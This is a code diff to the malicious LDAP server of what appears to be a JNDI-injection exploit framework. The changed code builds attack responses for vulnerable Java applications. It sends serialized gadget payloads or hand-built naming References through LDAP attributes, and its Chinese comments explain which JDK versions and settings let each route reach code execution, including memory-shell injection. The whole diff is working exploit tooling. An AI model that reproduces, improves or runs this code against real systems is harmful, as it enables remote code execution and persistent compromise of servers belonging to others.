@@ -1,7 +1,6 @@
 package com.bloom.server;
 
 import com.bloom.Template.CommandTemplate;
-import com.bloom.exploit.payload;
 import com.bloom.parser.ParsedRoute;
 import com.bloom.parser.RouteParser;
 import com.bloom.session.VerificationSession;
@@ -19,10 +18,15 @@ import com.unboundid.util.Base64;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
+import javax.naming.RefAddr;
+import javax.naming.Reference;
 import java.net.InetAddress;
 import java.net.URL;
+import java.util.Enumeration;
 
-import static com.bloom.exploit.payload.choiceMethod;
+import com.bloom.exploit.RefFactory;
+
+import com.bloom.exploit.chain.ChainDispatcher;
 import static com.bloom.util.Functions.getRandomString;
 import static com.bloom.util.Functions.ipCheck;
 
@@ -102,12 +106,37 @@ public class LdapServer extends InMemoryOperationInterceptor {
                 e.addAttribute("javaFactory", className);
                 payloadResult = className;
             } else {
-                String s = payload.choiceTypeByswitch(base);
-                try {
-                    e.addAttribute("javaSerializedData", Base64.decode(s));
-                    payloadResult = s;
-                } catch (Exception e1) {
-                    System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
+                // Reference 系默认走 javaSerializedData（序列化 ResourceRef）投递：
+                // 目标端从 javaReferenceAddress 属性只能重建出裸 javax.naming.Reference，
+                // 不满足 BeanFactory 的 instanceof ResourceRef 判断会直接返回 null；
+                // 反序列化得到的 ResourceRef 才能命中工厂。
+                // 目标端前提：trustSerialData=true（8u431/11.0.25/17.0.13/21.0.5 起默认 false），
+                // 且 JDK 21+ 的 jdk.jndi.ldap.object.factoriesFilter 默认仅放行 JDK 内置工厂，
+                // 该条件下两种投递均不可用。
+                // --ref-attrs 回退属性直返（仅限接受裸 Reference 的工厂，如 MemoryUserDatabaseFactory）。
+                boolean useRefAttrs = config.refAttrs && RefFactory.supports(route.getPayloadType());
+                Reference ref = useRefAttrs ? ChainDispatcher.generateReference(route) : null;
+                if (ref != null) {
+                    writeReferenceAttributes(e, ref);
+                    payloadResult = "ref:" + route.getPayloadType();
+                } else if (useRefAttrs) {
+                    // RefFactory 支持但拒绝生成（如 ELjakarta 内存马注入），已明确报错，
+                    // 不回退序列化路径产出废 payload
+                    System.out.println("Reference 生成被拒绝: " + route.getPayloadType());
+                } else {
+                    String s = ChainDispatcher.generate(route);
+                    if (s == null) {
+                        System.out.println(RefFactory.supports(route.getPayloadType())
+                                ? "Reference 生成被拒绝: " + route.getPayloadType()
+                                : "生成payload失败，使用的模块类型不正确或者命令错误");
+                    } else {
+                        try {
+                            e.addAttribute("javaSerializedData", Base64.decode(s));
+                            payloadResult = s;
+                        } catch (Exception e1) {
+                            System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
+                        }
+                    }
                 }
             }
 
@@ -115,17 +144,25 @@ public class LdapServer extends InMemoryOperationInterceptor {
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
+
+        // 把 Reference 拆成 JNDI LDAP 属性（javaClassName/javaFactory/javaReferenceAddress），
+        // javaReferenceAddress 按 RefAddr 序号编码为 #<i>#<type>#<content>（RFC 2713 语义手写）。
+        private void writeReferenceAttributes ( Entry e, Reference ref ) {
+            e.setAttribute("javaClassName", ref.getClassName());
+            e.setAttribute("javaFactory", ref.getFactoryClassName());
+            e.addAttribute("objectClass", "javaNamingReference");
+            Enumeration<? extends RefAddr> addrs = ref.getAll();
+            int i = 0;
+            while (addrs.hasMoreElements()) {
+                RefAddr addr = addrs.nextElement();
+                String content = addr.getContent() == null ? "" : addr.getContent().toString();
+                e.addAttribute("javaReferenceAddress", "#" + i + "#" + addr.getType() + "#" + content);
+                i++;
+            }
+        }
     }
 
     public static VerificationSession getSession() {
         return session;
-    }
-
-    public static void main(String[] args) throws Exception {
-        String http_server_ip = "127.0.0.1";
-        int ldap_port = Integer.valueOf("1389");
-        int http_server_port = Integer.valueOf("8080");
-        HttpServerStart httpServerStart=new HttpServerStart();
-        httpServerStart.start1();
     }
 }
